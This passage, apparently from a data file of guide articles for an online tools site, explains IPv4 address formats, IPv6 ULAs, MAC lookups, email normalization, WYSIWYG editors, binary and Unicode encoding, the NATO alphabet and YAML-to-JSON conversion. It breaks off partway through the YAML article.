An IPv4 address is a 32-bit number. While humans read it in dotted-decimal notation (\`192.168.1.1\`), computers work with it as a single 32-bit integer. Different contexts require different representations, which is why IP address conversion tools are essential for network engineers, security professionals, and developers.

## IPv4 Address Formats

### Dotted-Decimal Notation
The most familiar format: four 8-bit octets separated by dots. Each octet ranges from 0 to 255, representing 8 binary bits.

### Binary Representation
Shows the underlying 32-bit structure, revealing the network/host boundary when combined with a subnet mask. Converting 192.168.1.1 to binary gives: \`11000000.10101000.00000001.00000001\`

### Hexadecimal Notation
Base-16 representation, common in programming and packet analysis. \`192.168.1.1\` becomes \`0xC0A80101\`. Each byte maps to two hex digits.

### 32-Bit Integer (Long Integer)
The raw numeric value of the IP address. \`192.168.1.1\` equals 3,232,235,777. Calculated by treating the dotted decimal as a 4-byte big-endian number.

### IPv4-Mapped IPv6
IPv4 addresses represented in IPv6 format: \`192.168.1.1\` becomes \`::ffff:192.168.1.1\` or \`::ffff:c0a8:0101\`

## Why Multiple Formats Matter

### Network Programming
Socket APIs often work with integer representations. Python's \`socket.inet_aton()\` and C's \`inet_pton()\` convert between string and binary forms. Storing IPs as integers in code enables efficient arithmetic comparisons and range checks.

### Database Storage
Storing IPs as integers is more efficient and enables range queries. Integer comparison is much faster than string comparison, and range queries for subnet membership become simple numeric comparisons.

### Packet Analysis
Wireshark and hex dump tools show packet data in hexadecimal. Network engineers need to convert between hex and dotted-decimal when analyzing packet captures and network traces.

### Regular Expressions and Pattern Matching
Understanding the binary structure helps write precise IP-matching patterns for security rules and log analysis scripts.

## IP Address Classes (Historical)

Before CIDR, IPv4 used classful addressing:

| Class | Range | Default Mask | Usage |
|-------|-------|--------------|-------|
| A | 0.0.0.0 - 127.255.255.255 | /8 | Large organizations |
| B | 128.0.0.0 - 191.255.255.255 | /16 | Medium organizations |
| C | 192.0.0.0 - 223.255.255.255 | /24 | Small networks |
| D | 224.0.0.0 - 239.255.255.255 | — | Multicast |
| E | 240.0.0.0 - 255.255.255.255 | — | Reserved |

Classes A, B, and C are for unicast. Classful addressing is largely obsolete (replaced by CIDR), but understanding it helps when reading older documentation and legacy network configurations.

## Special IPv4 Addresses

Key special address ranges:
- \`0.0.0.0/8\` — Unspecified/this network
- \`127.0.0.0/8\` — Loopback (localhost)
- \`10.0.0.0/8\`, \`172.16.0.0/12\`, \`192.168.0.0/16\` — Private (RFC 1918)
- \`169.254.0.0/16\` — Link-local (APIPA)
- \`192.0.2.0/24\`, \`198.51.100.0/24\`, \`203.0.113.0/24\` — Documentation/TEST-NET
- \`224.0.0.0/4\` — Multicast
- \`255.255.255.255/32\` — Limited broadcast

## Converting Between Formats

To convert dotted-decimal to integer:
1. Split by dots into four numbers
2. Multiply: \`first * 16777216 + second * 65536 + third * 256 + fourth\`
3. Result is the 32-bit integer

To convert integer to dotted-decimal:
1. Divide by 16777216 for first octet (take integer part, keep remainder)
2. Divide remainder by 65536 for second octet
3. Divide remainder by 256 for third octet
4. Remainder is the fourth octet

## Using the IPv4 Address Converter

Our converter tool handles:
1. **Input any format** — dotted-decimal, integer, hex, or binary
2. **See all representations** simultaneously in a clear layout
3. **Subnet information** — paste a CIDR address to see network details
4. **Copy any format** with one click
5. **Batch conversion** support for processing multiple addresses

Perfect for network documentation, programming projects that need IP arithmetic, and troubleshooting network configurations where different tools use different IP representations.
`,
  },
  {
    slug: 'ipv6-ula-generator-guide',
    toolPath: '/ipv6-ula-generator',
    title: 'IPv6 ULA Generator: Create Unique Local Addresses for Private Networks',
    description: 'Generate IPv6 Unique Local Addresses (ULA) for private networks. Understand the fd00::/8 address space.',
    keywords: ['IPv6 ULA', 'unique local address', 'IPv6 private', 'fd00 range', 'IPv6 generator'],
    category: 'Network',
    publishedAt: '2025-09-03',
    content: `## Understanding IPv6 Unique Local Addresses

IPv6 Unique Local Addresses (ULA) are the IPv6 equivalent of IPv4 private addresses (10.x.x.x, 172.16.x.x, 192.168.x.x). They are designed for use within private networks and organizations, without being routed on the global internet.

## ULA Address Structure

ULA addresses fall in the \`fc00::/7\` prefix range, specifically:
- \`fd00::/8\` — Locally assigned (most common)
- \`fc00::/8\` — Reserved for future centrally assigned use

A complete ULA address has this structure:
\`fd | Global ID (40 bits) | Subnet ID (16 bits) | Interface ID (64 bits)\`

The Global ID is randomly generated per organization, providing statistical uniqueness without central coordination.

## Why ULA Exists

IPv6 has 340 undecillion possible addresses, so why are private address ranges needed? ULA serves specific purposes:

### Stability
ULA addresses remain stable regardless of ISP or network changes. Unlike link-local addresses, ULA persists across reboots and network reconfigurations.

### Private Communication
Services that should never be publicly accessible (database servers, internal APIs, management interfaces) should bind to addresses that cannot be reached from the internet.

### Multi-Network Scenarios
Organizations with multiple sites can use ULA for inter-site VPN connectivity. A unique Global ID per organization prevents address conflicts when networks are merged.

## ULA vs. Other IPv6 Address Types

| Property | Link-Local | ULA | Global Unicast |
|----------|------------|-----|----------------|
| Scope | Single link only | Organization-wide | Global internet |
| Persistent | Yes | Yes | Yes |
| ISP assigned | No | No | Yes |
| Routable between subnets | No | Yes (within org) | Yes |
| Internet routable | No | No | Yes |

## Generating ULA Addresses

The RFC 4193 algorithm for generating ULA Global IDs:
1. Obtain current time as 64-bit NTP timestamp
2. Concatenate with the EUI-64 identifier of the generating system
3. Compute SHA-1 hash
4. Use the lowest 40 bits as the Global ID

This approach ensures statistical uniqueness without requiring central registry. The probability of two randomly generated 40-bit IDs colliding is extremely low — acceptable for any practical deployment.

## Practical IPv6 Network Setup

### Home/Small Office Network
A /48 ULA prefix provides 65,536 possible /64 subnets:
- Main network: first /64 subnet
- IoT devices: second /64 subnet
- Guest network: third /64 subnet

### Enterprise Multi-Site
Different subnet blocks can be allocated to different sites within the same /48, enabling clear addressing hierarchy while maintaining organizational cohesion.

## Configuring ULA on Common Platforms

ULA addresses can be statically configured on Linux via networkd or ifconfig, advertised via Router Advertisement daemon (radvd), used in Docker IPv6 networks, and set via PowerShell on Windows. Most modern operating systems and networking equipment fully support ULA addressing.

## ULA and IPv6 Philosophy

Unlike IPv4 NAT (which hides private addresses behind a public IP), IPv6 philosophy favors end-to-end connectivity with proper firewall policies. Most IPv6-capable devices are dual-stack (having both ULA and Global Unicast addresses), using the appropriate address based on destination.

ULA addresses are filtered at internet borders — packets with ULA source or destination addresses are dropped by properly configured routers, providing a security boundary similar to RFC 1918 in IPv4.

## Using the ULA Generator

Our ULA generator tool:
1. **Generates a cryptographically random Global ID** following RFC 4193
2. **Creates a full /48 prefix** ready for subnet allocation
3. **Shows individual /64 subnets** for your chosen number of subnets
4. **Generates full interface addresses** with random host portions
5. **Copies in standard notation** for direct use in configurations

Use ULA for stable, private IPv6 addressing in your networks, homelabs, and containerized environments.
`,
  },
  {
    slug: 'mac-address-lookup-guide',
    toolPath: '/mac-address-lookup',
    title: 'MAC Address Lookup: Find the Manufacturer from Any MAC Address',
    description: 'Look up the vendor/manufacturer of any network device using its MAC address OUI prefix.',
    keywords: ['MAC address lookup', 'OUI lookup', 'MAC vendor lookup', 'network manufacturer', 'MAC address vendor'],
    category: 'Network',
    publishedAt: '2025-09-04',
    content: `## What Is a MAC Address?

A **Media Access Control (MAC) address** is a unique hardware identifier assigned to every network interface card (NIC). It operates at Layer 2 (Data Link Layer) of the OSI model and is used for local network communication. While IP addresses identify devices logically and can change, MAC addresses are typically burned into hardware by the manufacturer.

## MAC Address Structure

A MAC address is 48 bits (6 bytes) long, displayed in hexadecimal:
- Colon-separated: \`AA:BB:CC:DD:EE:FF\`
- Dash-separated (Windows): \`AA-BB-CC-DD-EE-FF\`
- Cisco format: \`AABB.CCDD.EEFF\`

### OUI (Organizationally Unique Identifier)
The first 3 bytes (24 bits) are the **OUI** — assigned by IEEE to each manufacturer. By looking up the OUI, you can identify who made the network hardware:
- Apple, Inc.
- VMware (indicating virtualized hardware)
- Raspberry Pi Foundation
- Intel Corporate
- Cisco Systems

### Device Identifier
The last 3 bytes are assigned by the manufacturer to uniquely identify each device. Together, the full 48-bit address creates a globally unique identifier for the network interface.

## MAC Address Types

### Unicast vs. Multicast
- **Unicast** (LSB of first byte = 0): Identifies a single network interface
- **Multicast** (LSB of first byte = 1): Targets a group of devices
- **Broadcast** (FF:FF:FF:FF:FF:FF): Reaches all devices on the segment

Common multicast addresses include IPv4 and IPv6 multicast ranges.

### Universally Administered (UAA) vs. Locally Administered (LAA)
- **UAA** (second bit of first byte = 0): Manufacturer-assigned, globally unique
- **LAA** (second bit of first byte = 1): Locally assigned, may not be globally unique

### Random/Spoofed MAC Addresses
Modern devices randomize MAC addresses for privacy (iOS 14+, Android 10+, Windows 10+). These locally administered addresses prevent tracking across different networks and locations.

## Finding MAC Addresses

On different platforms:
- **Windows**: \`ipconfig /all\` or \`getmac /v\`
- **macOS/Linux**: \`ifconfig\` or \`ip link show\`
- **Network scan**: \`arp -a\` shows the ARP cache, mapping IPs to MACs on your local network

## MAC Address Security Considerations

### ARP Spoofing
Attackers can send fake ARP responses to associate their MAC address with another device's IP. This enables man-in-the-middle attacks and traffic interception. Defense: Dynamic ARP Inspection (DAI) on managed switches.

### MAC Flooding
Flooding a switch's MAC address table with fake addresses, causing it to behave like a hub and broadcast all traffic. Defense: port security limiting MAC addresses per port.

### MAC Filtering
Using MAC addresses as an access control mechanism has significant weaknesses — MAC addresses can be trivially spoofed, making MAC filtering an unreliable security measure on its own.

## Using the MAC Address Lookup Tool

Our MAC address lookup tool provides:

1. **OUI Identification** — Enter any MAC address to identify the manufacturer
2. **Bulk Lookup** — Process multiple MAC addresses at once
3. **Format Detection** — Accepts colons, dashes, dots, or no separators
4. **Company Details** — Full registered company name
5. **Device Classification** — Identify virtual adapters, IoT devices, phones, and PCs

Useful for network administrators investigating unknown devices on their network, security audits to identify unauthorized hardware, and network inventory documentation.

## MAC vs. IP Address Summary

| Feature | MAC Address | IP Address |
|---------|-------------|------------|
| Layer | Layer 2 (Data Link) | Layer 3 (Network) |
| Length | 48 bits | 32 bits (IPv4) / 128 bits (IPv6) |
| Assignment | Hardware (manufacturer) | Logical (manual or DHCP) |
| Scope | Local network segment | Global (internet) |
| Changes | Usually permanent (but can be spoofed) | Dynamic (DHCP) or static |
| Used for | Local frame delivery | Packet routing |

Understanding the relationship between MAC and IP addresses is fundamental to network troubleshooting and security analysis.
`,
  },
  {
    slug: 'email-normalizer-guide',
    toolPath: '/email-normalizer',
    title: 'Email Normalizer: Clean and Standardize Email Addresses',
    description: 'Normalize email addresses to prevent duplicate accounts. Learn about Gmail dots, plus-addressing, and provider-specific rules.',
    keywords: ['email normalizer', 'email validation', 'email deduplication', 'Gmail aliases', 'email cleaning'],
    category: 'Development',
    publishedAt: '2025-09-05',
    content: `## What Is Email Normalization?

Email normalization is the process of standardizing email addresses to their canonical form — removing variations that point to the same mailbox. Different email providers have different rules about what makes addresses equivalent, and normalization ensures you're treating identical addresses consistently in your systems.

## Why Email Normalization Matters

Without normalization, your system might register the same person multiple times using different address formats. This leads to duplicate accounts in your user database, wasted marketing emails to the same person, inaccurate analytics inflating unique user counts, and bypassed rate limiting using email variations.

## Provider-Specific Email Rules

### Gmail / Google Workspace
- **Dots are ignored**: \`john.doe@gmail.com\` equals \`johndoe@gmail.com\`
- **Plus aliases ignored**: \`user+anything@gmail.com\` becomes \`user@gmail.com\`
- **Case insensitive**: All addresses normalized to lowercase
- **Googlemail equals Gmail**: Both domains point to the same inbox

### Outlook / Hotmail / Live
- **Plus aliases supported**: \`user+tag@outlook.com\` becomes \`user@outlook.com\`
- **Case insensitive**: Normalized to lowercase
- **Dots are significant**: Unlike Gmail, dots matter in Outlook addresses
- **Domain aliases**: @hotmail.com, @live.com, and @outlook.com are different accounts

### Yahoo
- **Hyphens can be significant**: Check whether they affect the local part
- **Dots are significant**: Unlike Gmail, dots matter
- **Case insensitive**: Normalized to lowercase

## The Normalization Algorithm

A general-purpose normalization approach:
1. Lowercase the entire address and trim whitespace
2. Split into local part and domain
3. Remove plus aliases (split on \`+\`, take first part)
4. Apply provider-specific rules (Gmail dot removal)
5. Normalize known domain aliases

## Common Use Cases

### User Registration Deduplication
Before inserting a new user, normalize and check for existing records with the same normalized email. This prevents duplicate accounts from being created with slight variations of the same address.

### Marketing List Cleaning
Run your email list through normalization to identify and merge duplicate contacts, remove aliases before calculating unique reach, and standardize data for CRM import.

### Abuse Prevention
Users sometimes create multiple accounts using email variations to bypass free trial limits, create multiple voting accounts, or circumvent bans. Normalization catches these patterns at registration time.

### Analytics Accuracy
If tracking email-based user behavior, normalize first to ensure cross-session and cross-device behavior is attributed correctly to the same user.

## Email Validation vs. Normalization

These are distinct but complementary processes:

**Validation** checks if an email is properly formatted — ensuring it has an @ symbol, a domain with a TLD, and no invalid characters.

**Normalization** standardizes valid addresses — converting \`User+Test@Gmail.com\` to \`user@gmail.com\`.

Both should be applied: validate format first, then normalize to canonical form.

## A Comprehensive Email Processing Pipeline

1. Validate format (regex check)
2. Normalize to canonical form (provider-specific rules)
3. Check against disposable provider list (Mailinator, Guerrilla Mail, etc.)
4. Verify MX record exists (DNS lookup)
5. Store normalized form in database alongside original

## Using the Email Normalizer Tool

Our email normalizer:
1. **Detects the email provider** automatically
2. **Applies provider-specific rules** for Gmail, Outlook, Yahoo, and others
3. **Shows what was changed** — highlights removed dots, plus aliases, and case changes
4. **Batch processing** — normalize multiple emails at once
5. **Copy results** in CSV format for database import

Normalizing emails during registration and list import is one of the most cost-effective data quality improvements you can implement in a user-facing application.
`,
  },
  {
    slug: 'html-wysiwyg-editor-guide',
    toolPath: '/html-wysiwyg-editor',
    title: 'WYSIWYG HTML Editor: Edit and Export Clean HTML Online',
    description: 'Use our browser-based WYSIWYG editor to create formatted HTML content without writing code.',
    keywords: ['HTML WYSIWYG editor', 'online HTML editor', 'rich text editor', 'HTML generator', 'visual HTML editor'],
    category: 'Web',
    publishedAt: '2025-09-06',
    content: `## What Is a WYSIWYG Editor?

**WYSIWYG** stands for "What You See Is What You Get" — a content editing paradigm where the editor display matches the final rendered output. Users format content visually (like in a word processor) without writing HTML code.

WYSIWYG HTML editors are essential for CMS platforms, email marketing tools, documentation systems, and anywhere non-technical users need to create formatted content.

## How WYSIWYG Editors Work

Under the hood, WYSIWYG editors use the browser's \`contenteditable\` attribute, which enables direct text editing within any DOM element. The editor library then intercepts keyboard events and mouse selections, applies formatting commands, serializes the DOM to clean HTML, and sanitizes output to prevent XSS vulnerabilities.

Modern editors like Quill.js, Tiptap, and ProseMirror use a virtual document model for reliable cross-browser behavior.

## Common Formatting Features

### Inline Formatting
Bold, italic, underline, strikethrough, superscript, subscript, inline code — all mapped to standard HTML tags.

### Block Formatting
Headings (h1-h6), paragraphs, blockquotes, code blocks, ordered and unordered lists, horizontal rules.

### Rich Elements
Links with URL and target attributes, images with alt text, tables with row/column controls, and embedded media via iframes.

## Popular WYSIWYG Libraries

### TinyMCE
The most widely deployed WYSIWYG editor, used by WordPress and thousands of web applications. Features an extensive plugin ecosystem, strong accessibility support, and complex table handling.

### Quill.js
Modern, lightweight editor with a clean API. Popular for single-page applications and custom integrations.

### ProseMirror
Framework-level editor used as the foundation for Notion, Confluence, and others. Highly extensible but requires more setup.

### Tiptap
Built on ProseMirror with a friendlier API. Popular in Vue.js and React applications.

### CKEditor 5
Enterprise-grade editor with collaborative editing, comments, and track changes.

## HTML Sanitization: Critical Security Concern

WYSIWYG editors create a significant security risk: **Cross-Site Scripting (XSS)**. Users can inject malicious HTML through the editor if output is not sanitized before storage or rendering.

Always sanitize editor output before storing or displaying it. The DOMPurify library is the industry standard for client-side HTML sanitization. Server-side sanitization using libraries like sanitize-html in Node.js or the Bleach library in Python provides an additional layer of protection.

## The Markdown Alternative

For technical users, Markdown editors offer a simpler, more portable alternative. Many modern editors support both modes: WYSIWYG for non-technical users and raw Markdown for developers.

Comparison:
- WYSIWYG: Low learning curve, high visual fidelity, but produces HTML that's less portable
- Markdown: Medium learning curve, plain text that works excellently with version control and static site generators

## Using the HTML WYSIWYG Editor Tool

Our editor provides:
1. **Toolbar formatting** — Bold, italic, headings, lists, links, and more
2. **Live preview** — See rendered HTML alongside the editor
3. **HTML source view** — Toggle to edit raw HTML directly
4. **Copy HTML** — Export the full formatted HTML
5. **Paste from Word** — Cleans up Word-specific markup automatically

Perfect for quickly creating HTML content, testing formatting, or generating email HTML without setting up a full development environment. The tool is especially useful for content creators who need to produce clean, standards-compliant HTML without hand-coding it.
`,
  },
  {
    slug: 'text-to-binary-guide',
    toolPath: '/text-to-binary',
    title: 'Text to Binary Converter: Encode Text as Binary (and Back)',
    description: 'Convert text to binary representation and back. Learn how computers represent characters as bits.',
    keywords: ['text to binary', 'binary converter', 'ASCII binary', 'text binary encoding', 'binary to text'],
    category: 'Converter',
    publishedAt: '2025-09-07',
    content: `## What Is Binary Encoding?

Binary encoding represents text characters as sequences of 0s and 1s — the fundamental language of computers. Every character you type, every image you see, every sound you hear is ultimately stored as binary data in computer memory and storage.

## How Text-to-Binary Conversion Works

Text is converted to binary through a two-step process:
1. Map each character to a numeric code point (using ASCII or Unicode)
2. Convert that number to its binary representation

### ASCII Encoding
For standard Latin text, **ASCII (American Standard Code for Information Interchange)** uses 7 bits per character. Common examples:
- 'A' = decimal 65 = binary 01000001
- 'a' = decimal 97 = binary 01100001
- '0' = decimal 48 = binary 00110000
- Space = decimal 32 = binary 00100000

Converting "Hello" to binary gives five 8-bit groups, one for each character.

### UTF-8 Encoding
Modern text uses **UTF-8**, a variable-width encoding that can represent all 1.1 million Unicode code points:
- ASCII characters (U+0000 to U+007F): 1 byte
- Latin extended, Greek, Cyrillic: 2 bytes
- Chinese, Japanese, Korean: 3 bytes
- Emoji, rare scripts: 4 bytes

## Why Binary Matters for Developers

### Memory Layout
Understanding binary helps predict how data is stored. Integer types occupy 1, 2, 4, or 8 bytes. The most significant bit often serves as a sign bit in signed integer types.

### Bitwise Operations
Efficient operations on binary flags are a fundamental programming technique:
- AND (\`&\`): Check if a bit is set
- OR (\`|\`): Set a bit
- XOR (\`^\`): Toggle a bit
- NOT (\`~\`): Flip all bits
- Left shift (\`<<\`): Multiply by powers of 2
- Right shift (\`>>\`): Divide by powers of 2

Example use: Unix file permissions store read, write, and execute as individual bits in a byte.

### Network Protocols
Network engineers and security researchers frequently work with binary representations when analyzing packet captures, implementing protocols, and debugging network issues.

### Data Compression
Compression algorithms work at the bit level. Understanding how text maps to binary is essential for implementing or understanding algorithms like Huffman coding and LZ77.

## Binary Number Systems

### Counting in Binary
Binary uses only digits 0 and 1. Each position represents a power of 2:
- Position 0 (rightmost): 2^0 = 1
- Position 1: 2^1 = 2
- Position 2: 2^2 = 4
- Position 3: 2^3 = 8

### Binary to Decimal Conversion
Sum the values of all positions where a 1 appears. For example, binary 1010 = 8 + 0 + 2 + 0 = 10 decimal.

### Decimal to Binary Conversion
Repeatedly divide by 2 and record remainders from bottom to top. The remainders form the binary number.

## Related Encodings

### Hexadecimal
Hex is base-16, using digits 0-9 and A-F. Each hex digit represents exactly 4 binary bits (a "nibble"), making hex a compact representation of binary data. A single byte (8 bits) maps to two hex digits.

### Octal
Base-8, where each octal digit represents 3 binary bits. Less common today but still used in Unix file permissions.

### Base64
Groups 6 bits together to create characters from a 64-character alphabet. Used extensively for encoding binary data in text contexts (email attachments, data URLs).

## Practical Text-to-Binary Examples

Binary is used in:
- **Debugging protocols**: Understanding raw packet data
- **Learning computer science**: Visualizing how computers represent data
- **Steganography**: Hiding messages in binary patterns
- **Hardware programming**: Sending bit patterns to microcontrollers
- **Educational contexts**: Teaching number systems and encoding

## Using the Text-to-Binary Tool

Our converter provides:
1. **Text to binary** — Convert any text to its binary representation
2. **Binary to text** — Decode binary back to readable text
3. **Encoding selection** — Choose ASCII, UTF-8, or UTF-16
4. **Space separator** — Toggle spaces between bytes for readability
5. **Copy result** — One-click copy of the binary output

The tool is useful for educational purposes, debugging encoding issues, and understanding how computers represent human-readable text at the lowest level.
`,
  },
  {
    slug: 'text-to-nato-guide',
    toolPath: '/text-to-nato-alphabet',
    title: 'NATO Phonetic Alphabet: Spell Words Clearly Over Radio and Phone',
    description: 'Convert any word to NATO phonetic alphabet (Alpha, Bravo, Charlie...). Learn why it\'s used and how it works.',
    keywords: ['NATO phonetic alphabet', 'phonetic spelling', 'Alpha Bravo Charlie', 'military alphabet', 'ICAO alphabet'],
    category: 'Converter',
    publishedAt: '2025-09-08',
    content: `## What Is the NATO Phonetic Alphabet?

The NATO phonetic alphabet — officially called the **International Radiotelephony Spelling Alphabet** — is a standardized set of words used to clearly spell out letters over radio communications, telephone calls, and other voice channels. Each letter of the Latin alphabet is represented by a specific word chosen for its distinctiveness.

## The Complete NATO Alphabet

| Letter | NATO Word | Pronunciation |
|--------|-----------|---------------|
| A | Alpha | AL-fah |
| B | Bravo | BRAH-voh |
| C | Charlie | CHAR-lee |
| D | Delta | DEL-tah |
| E | Echo | EK-oh |
| F | Foxtrot | FOKS-trot |
| G | Golf | Golf |
| H | Hotel | HO-tel |
| I | India | IN-dee-ah |
| J | Juliett | JEW-lee-et |
| K | Kilo | KEY-loh |
| L | Lima | LEE-mah |
| M | Mike | Mike |
| N | November | No-VEM-ber |
| O | Oscar | OSS-car |
| P | Papa | PAH-pah |
| Q | Quebec | keh-BECK |
| R | Romeo | ROH-mee-oh |
| S | Sierra | See-AIR-rah |
| T | Tango | TANG-go |
| U | Uniform | YOU-ni-form |
| V | Victor | VIK-tor |
| W | Whiskey | WISS-key |
| X | X-ray | EKS-ray |
| Y | Yankee | YANG-key |
| Z | Zulu | ZOO-loo |

## History of the Phonetic Alphabet

### Early Attempts
Radio communication in World War I and II highlighted the need for standardized spelling alphabets. Early alphabets used words like "Ace, Beer, Cast" but lacked international consistency.

### ICAO Development (1956)
The International Civil Aviation Organization (ICAO) developed the current alphabet in 1956. It was specifically designed so that each word sounds distinctly different from all others, even through static, noise, and across different accents. The words were tested with speakers from various linguistic backgrounds to ensure clarity.

### NATO Adoption
NATO officially adopted the ICAO alphabet, which is why it's known as the NATO phonetic alphabet. The same alphabet is used by ICAO, NATO, the International Telecommunication Union (ITU), and military forces worldwide.

## When to Use the Phonetic Alphabet

### Spelling Critical Information
When accuracy is essential and mishearing is costly:
- Serial numbers and product codes
- Account numbers and passwords
- Medical record numbers
- License plate numbers
- Complex names in customer service calls

### Aviation
Pilots and air traffic controllers use the phonetic alphabet for callsigns, runway names, navigation fixes, and all alphanumeric communication. "Golf Whiskey Sierra three-four-zero" is unmistakably clear where "GWS340" might be misheard.

### Military Communications
Field communications over radio are often degraded by interference. The phonetic alphabet ensures orders and coordinates are understood correctly.

### Emergency Services
Police, fire, and ambulance services use phonetic alphabets (sometimes adapted from NATO) when relaying registration plates, names, and addresses.

## Digits in Radio Communication

NATO also defines standardized pronunciations for digits:
- 0 = Zero
- 1 = One (WUN)
- 2 = Two (TOO)
- 3 = Three (TREE)
- 4 = Four (FOW-er)
- 5 = Five (FIFE)
- 6 = Six
- 7 = Seven (SEV-en)
- 8 = Eight (AIT)
- 9 = Nine (NIN-er)

Note "niner" instead of nine — to avoid confusion with the German "nein" (no) in multinational operations.

## Alternative Phonetic Alphabets

Different regions and industries have their own spelling alphabets:
- **LAPD/Police**: Adam, Boy, Charles, David...
- **British Forces** (older): Ace, Beer, Charlie, Dog...
- **US Army WWII**: Able, Baker, Charlie, Dog...

The NATO alphabet has largely supplanted these in international contexts.

## Using the Text-to-NATO Tool

Our converter:
1. **Converts any text** — type letters, numbers, or mixed content
2. **Shows NATO words** for each character
3. **Formats for reading aloud** — suitable for copy-paste into scripts
4. **Handles numbers** with proper NATO digit pronunciation
5. **Supports special characters** — spaces and punctuation are handled gracefully

Use it when preparing customer service scripts, training materials, or any situation where you need to spell out alphanumeric codes over voice communication.
`,
  },
  {
    slug: 'text-to-unicode-guide',
    toolPath: '/text-to-unicode',
    title: 'Unicode Explained: Characters, Code Points, and Encoding',
    description: 'Convert text to Unicode code points. Learn about Unicode, UTF-8, and how modern software handles international text.',
    keywords: ['unicode converter', 'text to unicode', 'unicode code points', 'UTF-8 encoding', 'unicode characters'],
    category: 'Converter',
    publishedAt: '2025-09-09',
    content: `## What Is Unicode?

**Unicode** is the universal character encoding standard that assigns a unique number — called a **code point** — to every character in every writing system in the world. From Latin letters to Chinese hanzi, Arabic script to emoji, Unicode covers over 149,000 characters across 154 scripts.

Unicode solves a fundamental problem in computing: historically, different countries and companies created incompatible character encodings, making it impossible to reliably exchange text across systems.

## Unicode Code Points

A Unicode code point is written as \`U+\` followed by a hexadecimal number:
- \`U+0041\` = A (Latin capital letter A)
- \`U+4E2D\` = 中 (Chinese character for "middle")
- \`U+1F600\` = 😀 (Grinning Face emoji)
- \`U+0021\` = ! (Exclamation mark)

The code point range spans from \`U+0000\` to \`U+10FFFF\`, divided into 17 **planes** of 65,536 code points each.

## Unicode Planes

### Plane 0: Basic Multilingual Plane (BMP)
The most commonly used characters, including all modern scripts:
- Latin, Greek, Cyrillic, Hebrew, Arabic, Devanagari
- CJK (Chinese, Japanese, Korean) characters
- Most punctuation, symbols, and special characters

### Plane 1: Supplementary Multilingual Plane
- Historic scripts (Linear B, Egyptian hieroglyphs, Cuneiform)
- Musical symbols
- Mathematical symbols
- Many emoji

### Plane 2: Supplementary Ideographic Plane
- Additional CJK unified ideographs (rare characters)

### Planes 3-13: Reserved
Currently unassigned.

### Planes 14-16: Supplementary Special-Purpose Planes
- Tags and variation selectors

## Unicode Encodings

### UTF-8
The dominant encoding on the web (used by over 98% of websites):
- ASCII characters use 1 byte
- Most European characters use 2 bytes
- CJK characters use 3 bytes
- Emoji and supplementary characters use 4 bytes

UTF-8 is backward compatible with ASCII — any ASCII file is valid UTF-8.

### UTF-16
Used by Windows and Java internally:
- Most characters use 2 bytes
- Supplementary plane characters use 4 bytes (surrogate pairs)
- Not backward compatible with ASCII

### UTF-32
Fixed-width 4-byte encoding. Simple to index but memory-inefficient. Used internally by some programming languages.

## Unicode in Programming

### JavaScript
JavaScript strings are UTF-16 internally. Working with supplementary plane characters requires care:
\`\`\`javascript
'A'.charCodeAt(0)      // 65 (code point)
'\\u0041'               // 'A' (Unicode escape)
'\\u{1F600}'            // '😀' (ES6 extended escape)
'😀'.length            // 2 (two UTF-16 code units!)
[...'😀'].length       // 1 (correct character count)
\`\`\`

### Python
Python 3 strings are sequences of Unicode code points:
\`\`\`python
ord('A')           # 65
chr(65)            # 'A'
'\\u0041'           # 'A'
'\\U0001F600'       # '😀'
len('😀')          # 1 (correct in Python 3)
\`\`\`

### HTML
Unicode characters in HTML:
\`\`\`html
&#65;       <!-- A (decimal) -->
&#x41;      <!-- A (hexadecimal) -->
&amp;       <!-- & (named entity) -->
\`\`\`

## Unicode Normalization

The same visual character can sometimes be represented multiple ways:
- Precomposed: \`é\` = U+00E9 (single code point)
- Decomposed: \`é\` = U+0065 + U+0301 (e + combining accent)

Unicode defines normalization forms to standardize these representations:
- **NFC** (Canonical Decomposition, followed by Canonical Composition) — preferred for most uses
- **NFD** (Canonical Decomposition) — decomposed form
- **NFKC/NFKD** — compatibility normalization

Failing to normalize can cause string comparison bugs, search failures, and security issues.

## Special Unicode Characters

Some useful Unicode code points for developers:
- \`U+FEFF\` — Byte Order Mark (BOM) / Zero Width No-Break Space
- \`U+200B\` — Zero Width Space (invisible, affects word breaking)
- \`U+200D\` — Zero Width Joiner (used in emoji sequences)
- \`U+FFFE\` — Non-character (used for encoding detection)
- \`U+202E\` — Right-to-Left Override (can be used for spoofing)

## Using the Text-to-Unicode Tool

Our converter:
1. **Shows Unicode code points** for every character in your text
2. **Displays multiple formats** — U+ notation, decimal, hex, HTML entity
3. **Identifies script/block** — shows which Unicode block each character belongs to
4. **Converts back** — paste code points to decode to text
5. **Handles emoji** — correctly processes multi-codepoint sequences

Use it for debugging encoding issues, learning about Unicode, preparing documentation about special characters, and inspecting suspicious text that might contain invisible or look-alike characters.
`,
  },
  {
    slug: 'yaml-to-json-guide',
    toolPath: '/yaml-to-json-converter',
    title: 'YAML to JSON Converter: When and How to Convert Configuration Files',
    description: 'Convert YAML to JSON with our free online tool. Learn when to use each format and common conversion pitfalls.',
    keywords: ['YAML to JSON', 'convert YAML JSON', 'YAML converter', 'JSON from YAML', 'configuration converter'],
    category: 'Converter',
    publishedAt: '2025-09-10',
    content: `## What Is YAML and Why Convert It to JSON?

**YAML** (YAML Ain't Markup Language) is a human-friendly data serialization format widely used for configuration files. **JSON** (JavaScript Object Notation) is the universal data interchange format for web APIs and applications. While both represent structured data, they have different strengths and are used in different contexts.

Converting YAML to JSON is a common need when:
- Processing configuration files in JavaScript/Node.js applications
- Sending data to REST APIs that expect JSON
- Integrating YAML-based tools with JSON-based systems
- Converting Kubernetes/Docker YAML configs for API consumption
- Debugging configuration by viewing it in a JSON viewer

## YAML Syntax Overview

YAML uses indentation and special characters instead of braces and brackets:

\`\`\`yaml
# A YAML configuration example
server:
  host: localhost
  port: 8080
  ssl: true

database:
  url: postgresql://localhost:5432/mydb
  pool_size: 10

features:
  - authentication
  - caching
  - logging
\`\`\`

Key YAML features:
- **Indentation** defines structure (2 or 4 spaces, never tabs)
- **Colons** separate keys and values
- **Dashes** indicate list items
- **Hash** symbols start comments
- **Quotes** are optional for most strings

## YAML Data Types

YAML automatically infers types:
- \`true\`/\`false\` → Boolean
- \`42\` → Integer
- \`3.14\` → Float
- \`"hello"\` → String
- \`null\` or \`~\` → Null
- Dates like \`2024-01-15\` → Date (in some parsers)

This auto-detection can cause surprises — Norwegian municipality codes like \`NO\` might be interpreted as boolean \`false\` in some YAML parsers.

## The Equivalent JSON

The YAML example above converts to:

\`\`\`json
{
  "server": {
    "host": "localhost",
    "port": 8080,
    "ssl": true
  },
  "database": {
    "url": "postgresql://localhost:5432/mydb",
